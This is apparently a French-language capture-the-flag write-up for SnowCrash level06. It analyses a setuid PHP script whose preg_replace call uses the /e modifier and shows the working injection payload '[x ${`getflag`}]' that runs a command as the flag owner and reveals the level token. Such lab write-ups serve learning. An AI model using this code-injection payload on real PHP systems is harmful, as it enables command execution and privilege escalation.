```bash
level06@SnowCrash:~$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```
il s'agit d'un binaire et d'un script php.

```bash
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
En regardant les deux fonctions on constate quelles utilisents preg_replace. preg_replace remplace la premiere expression par la deuxieme.

Cependant elle est sous forme de regex. Donc elle prent en concideration une expression qui contien des caracteres specifique.

la fonction x utilise file_get_contents. En outre la fonction x va prendre le contenu de l'argument pris en parametre.

Apres analyse du script on constate une regex bien exploitable, "/(\[x (.*)\])/e"

On s'est amuse sur ce site https://regex101.com/ a tester la regex. Tous ce qui sera en dehort de "[x ]" ne sera pas pris en compte. Et le fameux .* permet de prendre n'importe quoi en compte. Ce qui veux dire qu'en utilisant :

```bash
[x les cookies]
```

cela donne

```bash
level06@SnowCrash:~$ ./level06 /tmp/exploit
les cookies
```
Donc en remplacent par une expression en php cela donne 
```bash
[x ${`getflag`}]

level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Aussi a savoir qu'avec un strings ./level06 on peut trouver /home/user/level06/level06.php et justement les permisions nous permetent d'exploiter et d'injecter du code pour outrepasser les permissions comme pour l'exo avec le script perl






